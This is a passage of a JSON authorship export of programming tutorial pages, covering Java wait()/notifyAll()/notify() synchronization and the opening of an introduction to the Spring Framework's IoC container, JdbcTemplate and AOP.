      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "Besides synchronized keyword to guard a critical section, another important feature of Java Synchronization is **wait()** and **notify()**."
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "## wait() and notifyAll()"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "In a synchronized block, sometimes some conditions are required for execution. If such conditions are not met, wait() method can be used to give up the Monitor object lock and put the current thread into a * callback queue** once the conditions are met. Let us use the following code as an example."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "public synchronized void eatChicken() {"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "\twhile (!hasChicken) {"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "\t\twait();"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "\t}"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "\teat();"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "\thasChicken \u003d false;"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "public synchronized void cookChicken() {"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "\thasChicken \u003d true;"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "\tnotifyAll();"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "In method eatChicken, the condition of hasChicken must be true before eat() can take place. However, instead of terminating the method, the program can call wait() and then this thread is put into a * callback queue**. When some other threads change the conditions, in this case, if cookChicken() method produces chicken and the condition for eatChicken() might be changed, cookChicken() can call notifyAll(). notifyALl() wakes up one by one all the threads in the * callback queue** associated with the Monitor object used to by coooChicken(). In this case, eatChicken() is woken up and eatChicken() gains Monitor object lock and starts execution from wait() onwards. This is basically how wait() and notifyAll() work in Java. However, here are some points to take notes to use them correctly."
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Understand Which Object is Used as Monitor"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "As described from the very beginning, all the synchronized feature is associated with a Monitor object as a lock. This is also true for wait() and notifyAll(). The Monitor object associated with wait() and notifyAll() is the Monitor object associated with the synchronized block that calls wait() and notifyAll()."
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "When wait() is called, the current thread pull is put into the callback queue of the Monitor object of the synchronized block. When notifyAll() is called, only threads waiting in the Monitor object queue associated with notifyAll() will be notified. Therefore, in the above example of eatChicken() and cookChick(), the wait() and notifyAll() will only work if both eatChicken() and cookChicken() are associated with the same Monitor object."
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Check Condition for wait() With While Loop"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "wait() is usually used to check condition(e.g. hasChicken in the method eatChicken()). It is a good practice to always use wait() inside a while loop to check for the condition. This is to avoid the situation in which thread is woken for an unintended purpose. The example below illustrates this situation:"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "public synchronized void eatChicken() {"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "\tif (!hasChicken) {"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "\t\twait();"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "\t}"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "\teat();"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "\thasChicken \u003d false;"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "public synchronized void drink() {"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "\tif (!hasDrink) {"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "\t\twait();"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "\t}"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "\tdrink();"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "\thasDrink \u003d false;"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "public synchronized void cookChicken() {"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "\thasChicken \u003d true;"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "\tnotifyAll();"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "public synchronized void prepareDrink() {"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "\thasDrink \u003d true;"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "\tnotifyAll();"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "In this example, all four synchronized methods are associated with the same Monitor object. When both eatChicken() and drink() are called and are both put into the callback queue because current hasChicken is false and hasDrink is false, calling notifyAll() from cookChicken() will wake up both drink() and eatChicken() one after another. If while loop is not used to check for the condition, both drink() and eatChicken() will execute and the execution of drink() is not intended."
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "However, instead if while loop is used to check for the condition, when drink() is woken, hasDrink will be checked again and drink() will call wait() again. One alternative solution is to make sure all wait() and notifyAll() associated with the same Monitor object are checking the same conditions. However, this is hard to maintain and verify."
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "### Breakpoint of notifyAll()"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "One important point to take note when using notifyAll() is to understand what happens when notify all is called and how code gives up its Monitor object lock. Taking the following code snippet as an example:"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "public synchronized void foo() {"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "\tbefore();"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "\tnotifyAll();"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "\tafter();"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "When synchronized method foo() is called, it calls notifyAll() before after(). However, after notifyAll() is called, the method foo() does not give up Monitor object lock immediately. Instead, all codes in the synchronized block(in this case the method body) will be executed before the thread gives up the Monitor object lock and notifies all the threads in the callback queue."
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "## notify()"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "Another feature of synchronized is notify(), which notifies only one thread in the callback queue. This method is less used than notifyAll() because notify() only wakes up one randomly chosen thread from callback queue and it is hard to assert that the thread woken up is the intended thread. However, there are special situations in which notify() is used and is preferred. When all threads that call wait() are checking for the same condition, it is no different to call anyone of the thread. notify() can be used in this situation and is better than nofityAll() because notifyAll() wake up all the threads and is, therefore, more costly. When one can be sure that all the threads in the callback queue are waiting for the same condition, one can use notify()."
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "# Related Areas"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "Java Synchronization as demonstrated in this tutorial is easy to learn, and you are ready to use it after this tutorial. However, Java Synchronization is just a part of a bigger picture: Parallel programs in Java. To fully exploits the parallelism brought by modern hardware, you may also want to learn [Java Thread][2] and [Thread Safety][5]"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "[1]: https://en.wikipedia.org/wiki/Monitor_(synchronization)"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "[2]: to be updated when @ablyx finishes on java threads"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "[3]: https://en.wikipedia.org/wiki/Mutual_exclusion"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "[4]: https://en.wikipedia.org/wiki/Critical_section"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "[5]: https://en.wikipedia.org/wiki/Thread_safety"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "[6]: https://docs.oracle.com/javase/7/docs/api/java/lang/Object.html"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "[7]: https://en.wikipedia.org/wiki/Semaphore_(programming)"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 6,
      "iskandarzulkarnaien": 15,
      "-": 143
    }
  },
  {
    "path": "contents/java/Spring.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  title: Introduction to Spring Framework"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "0blivious"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "0blivious"
        },
        "content": "# Introduction to Spring Framework"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "0blivious"
        },
        "content": "**Authors: [Liu Yiwen](https://github.com/0blivious)** \u003cbr\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Reviewers: [Ang Ze Yu](https://github.com/ang-zeyu), [Lum Ka Fai Jeffry](https://github.com/j-lum), [Ni Tianzhen](https://github.com/niqiukun)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003cbox type\u003d\"info\"\u003e"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "0blivious"
        },
        "content": "This chapter assumes that the reader has a basic knowledge of Java enterprise."
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "0blivious"
        },
        "content": "* [What is Spring Framework‎](#what-is-spring-framework)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "0blivious"
        },
        "content": "* [Core Features](#core-features)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  * [The IOC Container](#the-ioc-container)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  * [Spring JdbcTemplate](#spring-jdbctemplate)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  * [Spring AOP](#spring-aop)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "0blivious"
        },
        "content": "* [Why use Spring‎](#why-use-spring)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  * [Benefit 1: Modularity](#benefit-1-modularity)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  * [Benefit 2: Easy Integration](#benefit-2-easy-integration)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  * [Benefit 3: Strong Community Support](#benefit-3-strong-community-support)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  * [Benefit 4: Usability](#benefit-4-usability)"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "0blivious"
        },
        "content": "* [How to get started‎](#how-to-get-started)"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "0blivious"
        },
        "content": "## What is Spring Framework?"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "0blivious"
        },
        "content": "The [official website](https://docs.spring.io/spring/docs/current/spring-framework-reference/overview.html) describes Spring Framework as follows:"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003e*Spring Framework* is an open-source framework to create Java enterprise applications."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003eIt provides foundational support for different application architectures, including messaging, transactional data and persistence, and web."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "0blivious"
        },
        "content": "## Core Features"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "0blivious"
        },
        "content": "### The IoC Container"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Normally, objects in a Java application often have to take on additional responsibilities such as creating other objects,"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "0blivious"
        },
        "content": "wiring them together, configuring them, and managing their life cycle. When using the Spring framework for an application,"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "0blivious"
        },
        "content": "the framework takes care of many of those responsibilities. This design approach is called inversion of control (IoC)"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "0blivious"
        },
        "content": "and Spring achieves it using something called the IoC container. The Spring IoC container manage the"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003ctooltip content\u003d\"A bean is an object that is instantiated, assembled, and otherwise managed by a Spring IoC container.\"\u003e"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003ci\u003ebeans \u003c/i\u003e"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003c/tooltip\u003ein Spring Framework. These beans are created with the configuration metadata that you supply to the container,"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "0blivious"
        },
        "content": "which can be in the form of XML configuration or annotations."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "0blivious"
        },
        "content": "To better understand how the IoC Container works, we will create an Employee class like so:"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```java"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "0blivious"
        },
        "content": "package com.company;  "
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  "
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "0blivious"
        },
        "content": "public class Employee {  "
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    private int id;  "
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    private String name;  "
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    private String city;  "
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  "
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    public int getId() {  "
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        return id;  "
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    }  "
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    public void setId(int id) {  "
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        this.id \u003d id;  "
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    }  "
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    public String getName() {  "
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        return name;  "
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    }  "
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    public void setName(String name) {  "
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        this.name \u003d name;  "
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    }  "
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    void display(){  "
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        System.out.println(id+\" \"+name);  "
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    }"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "0blivious"
        },
        "content": "}        "
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "0blivious"
        },
        "content": "We can then populate an Employee bean with the data provided in the following `applicationContext.xml` file:"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```xml"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003cbean id\u003d\"employeeAmy\" class\u003d\"com.company.Employee\"\u003e  "
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    \u003cproperty name\u003d\"id\"\u003e  "
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        \u003cvalue\u003e20\u003c/value\u003e  "
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    \u003c/property\u003e  "
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    \u003cproperty name\u003d\"name\"\u003e  "
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        \u003cvalue\u003eAmy\u003c/value\u003e  "
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    \u003c/property\u003e  "
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003c/bean\u003e  "
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "0blivious"
        },
        "content": "We then manually instantiate a container using the `applicationContext.xml` file we just created:"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```java"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "0blivious"
        },
        "content": "ApplicationContext context \u003d new ClassPathXmlApplicationContext(\"applicationContext.xml\");"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "0blivious"
        },
        "content": " "
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "0blivious"
        },
        "content": "To prove we managed to instantiate the bean correctly, we can have a `Test.java` looks like the following:"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```java"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Resource r \u003d new ClassPathResource(\"applicationContext.xml\");  "
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "0blivious"
        },
        "content": "BeanFactory factory \u003d new XmlBeanFactory(r);  "
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "0blivious"
        },
        "content": "          "
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Employee e \u003d (Employee)factory.getBean(\"obj\");  "
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "0blivious"
        },
        "content": "e.display();"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "0blivious"
        },
        "content": "The output of the above code would be `20 Amy`. Notice that the use of IoC container makes our code loosely coupled and easier for testing. "
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "0blivious"
        },
        "content": "### Spring JdbcTemplate"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "0blivious"
        },
        "content": "The Spring JdbcTemplate is a powerful mechanism to connect to the database and execute SQL queries. Traditionally, we"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "0blivious"
        },
        "content": "need to use Java Database Connectivity (JDBC) API to access tabular data stored in any relational database."
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "0blivious"
        },
        "content": "It is a part of JavaSE (Java Standard Edition)."
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    "
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "0blivious"
        },
        "content": "In a traditional JDBC API:"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "0blivious"
        },
        "content": "- a typical SQL query would involve quite some amount of boilerplate code, such as creating connection,"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "0blivious"
        },
        "content": "statement, closing resultset, connection etc."
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "0blivious"
        },
        "content": "- exception handling has to be manually written out."
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "0blivious"
        },
        "content": "- transactions need to be manually created."
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "0blivious"
        },
        "content": "The Spring JdbcTemplate provides methods to write the queries directly, hence, saving time in writing such boilerplate code."
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Task | Spring | You"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "0blivious"
        },
        "content": ":-----:|:--------:|:----:"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Connection Management | :far-check-circle: | "
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Writing SQL Queries | | :far-check-circle: "
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Statement Management | :far-check-circle: |"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "0blivious"
        },
        "content": "ResultSet Management | :far-check-circle: |"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Row Data Retrieval | | :far-check-circle: "
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Parameter Declaration | | :far-check-circle: "
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Parameter Setting | :far-check-circle: |"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Transaction Management | :far-check-circle: |"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Exception Handling | :far-check-circle: |"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "0blivious"
        },
        "content": "### Spring AOP"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Spring Framework addresses"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003ctooltip content\u003d\"Concerns that can affect the whole application and should be centralized in one location in code as much as possible. Examples of these concerns include transaction management, authentication, logging, security etc.\"\u003e"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003ci\u003ecross-cutting concerns\u003c/i\u003e\u003c/tooltip\u003e by supporting [Aspect Oriented Programming](https://en.wikipedia.org/wiki/Aspect-oriented_programming) (AOP)."
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "0blivious"
        },
